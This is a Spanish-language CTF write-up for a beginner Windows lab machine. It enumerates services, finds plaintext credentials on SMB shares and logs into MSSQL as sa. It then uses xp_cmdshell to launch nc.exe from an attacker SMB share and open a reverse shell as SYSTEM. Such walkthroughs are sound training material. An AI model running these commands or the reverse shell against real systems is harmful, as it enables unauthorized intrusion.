---
layout: post
title: accounting
date: 2024.07.01
categories: [thl, ctf, windows, principiante]
---

![image](/assets/images/accounting/acc.jpg)

Estamos ante una máquina Windows de nivel principiante creada por Wxrdcn de la plataforma [The Hackers Labs](https://thehackerslabs.com/).

# Enumeración

Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:

```bash
$ sudo arp-scan -I eth1 --localnet
[sudo] password for murrusko: 
Interface: eth1, type: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:63:af:94       PCS Systemtechnik GmbH
10.0.2.145      08:00:27:b0:1c:c9       PCS Systemtechnik GmbH
```

Como vemos la máquina tiene asignada la IP `10.0.2.145`.

Empezamos realizando un escaneo de puertos con `nmap`. Hacemos un escaneo silencioso`-sS`, a todos los puertos `-p-`, que nos de detalles del escaneo `-v`, que no haga ping al host `-Pn`, que no haga resolución de DNS `-n` y que nos guarde a un fichero grepeable `-oG` con nombre `ports.txt` a nuestra máquina victima `10.0.2.145`:

```bash
$ sudo nmap -sS -p- -Pn -n -v 10.0.2.145 -oG ports.txt
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1801/tcp  open  msmq
2103/tcp  open  zephyr-clt
2105/tcp  open  eklogin
2107/tcp  open  msmq-mgmt
5040/tcp  open  unknown
5357/tcp  open  wsdapi
7680/tcp  open  pando-pub
9047/tcp  open  unknown
9079/tcp  open  unknown
9080/tcp  open  glrpc
9081/tcp  open  cisco-aqos
9083/tcp  open  emc-pp-mgmtsvc
9147/tcp  open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49702/tcp open  unknown
49992/tcp open  unknown
```

Como tiene un montón de puertos abiertos obtenemos la lista con el siguiente comando:

```bash
$ cat ports.txt | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ','
135,139,445,1801,2103,2105,2107,5040,5357,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49669,49670,49672,49702,49992
```

Ahora hacemos otro escaneo con `nmap`, pero esta vez para ver con mas detalle que hay en esos puertos:

```bash
$ sudo nmap -sCV -p135,139,445,1801,2103,2105,2107,5040,5357,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49669,49670,49672,49702,49992 -v 10.0.2.145
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1801/tcp  open  msmq?
2103/tcp  open  msrpc         Microsoft Windows RPC
2105/tcp  open  msrpc         Microsoft Windows RPC
2107/tcp  open  msrpc         Microsoft Windows RPC
5040/tcp  open  unknown
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
9047/tcp  open  unknown
9079/tcp  open  unknown
9080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9081/tcp  open  http          Microsoft Cassini httpd 4.0.1.6 (ASP.NET 4.0.30319)
|_http-server-header: Cassini/4.0.1.6
| http-title: Login Saci
|_Requested resource was /App/Login.aspx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9083/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9147/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49992/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-30T06:56:01
| Not valid after:  2054-06-30T06:56:01
| MD5:   a060:b5e7:eaf0:3da6:de75:cbed:7d75:2686
|_SHA-1: 3208:f8bb:d393:2af9:05df:76b3:afa8:a688:f62f:30cb
|_ssl-date: 2024-06-30T17:30:37+00:00; +26s from scanner time.
| ms-sql-info: 
|   10.0.2.145\COMPAC: 
|     Instance name: COMPAC
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 49992
|_    Clustered: false
| ms-sql-ntlm-info: 
|   10.0.2.145\COMPAC: 
|     Target_Name: DESKTOP-M464J3M
|     NetBIOS_Domain_Name: DESKTOP-M464J3M
|     NetBIOS_Computer_Name: DESKTOP-M464J3M
|     DNS_Domain_Name: DESKTOP-M464J3M
|     DNS_Computer_Name: DESKTOP-M464J3M
|_    Product_Version: 10.0.19041
MAC Address: 08:00:27:B0:1C:C9 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: DESKTOP-M464J3M, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:b0:1c:c9 (Oracle VirtualBox virtual NIC)
| Names:
|   DESKTOP-M464J3M<00>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   DESKTOP-M464J3M<20>  Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-30T17:29:55
|_  start_date: N/A
|_clock-skew: mean: 26s, deviation: 0s, median: 25s
```

Encontramos una web en el puerto `9081`, vemos que tecnología usa con `whatweb`:

```bash
$ whatweb -a 3 http://10.0.2.145:9081
http://10.0.2.145:9081 [302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Cassini/4.0.1.6], IP[10.0.2.145], RedirectLocation[/App/Login.aspx], Title[Object moved]                                                                                                                                                         
http://10.0.2.145:9081/App/Login.aspx [200 OK] ASP_NET[4.0.30319], Bootstrap, Cookies[ASP.NET_SessionId], Country[RESERVED][ZZ], HTML5, HTTPServer[Cassini/4.0.1.6], HttpOnly[ASP.NET_SessionId], IP[10.0.2.145], JQuery[3.7.0], PasswordField[txtPassword], Script[text/javascript], Title[Login Saci]
```

Realizamos una búsqueda de ficheros y directorios con `feroxbuster`:

```bash
$ feroxbuster -u http://10.0.2.145:9081 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x aspx -r -d 2
...
200      GET        2l        2w       22c http://10.0.2.145:9081/download/notas.txt
...

```

Encontramos un fichero llamado `notas.txt`, lo descargamos y leemos lo que tiene:

```bash
curl http://10.0.2.145:9081/download/notas.txt
supervisor
supervisor
```

Parece que son las credenciales para acceder a la web. Nos logeamos con éxito pero no conseguimos hacer nada para ganar la intrusión. Asi que miramos a ver que hay en el servicio `samba`. Ejecutamos `smbclient` con los parámetros `—-no-pass` para no usar credenciales, `-L` para hacer un listado de unidades y el target `//10.0.2.145`:

```bash
$ smbclient --no-pass -L //10.0.2.145

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        Compac          Disk      
        IPC$            IPC       IPC remota
        Users           Disk
```

Vemos 2 recursos compartidos interesantes `Compac` y `Users`. Nos conectamos al recurso `Compac` y listamos los directorios:

```bash
smbclient --no-pass //10.0.2.145/Compac
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 11 04:49:15 2024
  ..                                  D        0  Sat May 11 04:49:15 2024
  Empresas                            D        0  Sat May 11 04:49:15 2024
  Index                               D        0  Sun Jun 30 23:52:48 2024
```

Haciendo un listado de `Empresas` vemos un fichero que llama la atención `SQL.txt`, lo descargamos a nuestra máquina:

```bash
smb: \Empresas\> get SQL.txt 
getting file \Empresas\SQL.txt of size 448 as SQL.txt (5.3 KiloBytes/sec) (average 5.3 KiloBytes/sec)
```

Lo abrimos y vemos unas posibles credenciales de acceso al servicio de `SQL Server`:

```bash
$ cat SQL.txt 
SQL 2017 
Instancia COMPAC 
sa 
Contpaqi2023.

```

# Intrusión

Vamos a usar el cliente de sql que trae el paquete `impacket`. Usamos `impacket-mssqlclient` con los parámetros `COMPAC/` , que es el nombre de dominio que hemos visto en el escaneo, seguido de las credenciales `sa:Contpaqi2023.` , le indicamos el target `@10.0.2.145` y el puerto, ya que no está en el puerto por defecto, `-port 49992`:

```bash
$ impacket-mssqlclient COMPAC/sa:Contpaqi2023.@10.0.2.145 -port 49992
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DESKTOP-M464J3M\COMPAC): Line 1: Changed database context to 'master'.
[*] INFO(DESKTOP-M464J3M\COMPAC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)>
```

En SQL Server hay un comando que sirve para ejecutar comandos por una shell, `xp_cmdshell`. Asi que una vez conectados probamos a ver si funciona el comando:

```bash
SQL (sa  dbo@master)> xp_cmdshell whoami
output                
-------------------   
nt authority\system   

NULL
```

Vemos que si y encima está ejecutando los comandos como **nt authority\system.** 

# Escalada de privilegios

Vamos a preparar la obtención de una shell remota como **nt authority\system**. Para ello nos copiamos el binario `nc.exe` a nuestro directorio de trabajo. También ponemos el servidor samba con `impacket-smbserver`:

```bash
$ cp /usr/share/windows-binaries/nc.exe .

$ impacket-smbserver -smb2support murrusko .
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Nos ponemos a la escucha en nuestra máquina:

```bash
$ nc -nlvp 8888
listening on [any] 8888 ...
```

Y ejecutamos el comando para obtener la shell reversa:

```bash
SQL (sa  dbo@master)> xp_cmdshell \\10.0.2.5\murrusko\nc.exe 10.0.2.5 8888 -e cmd
```

Conseguimos la shell y vemos que realmente estamos con **nt authority\system**:

```bash
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.0.2.5] from (UNKNOWN) [10.0.2.145] 49246
Microsoft Windows [Versi?n 10.0.19045.2965]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami  
whoami
nt authority\system

C:\Windows\system32>
```

Ahora solo queda obtener las flags, pero antes solo queda un reto, obtener la flag de root… Os lo dejo a vosotros, como pista buscar **ADS data streams**
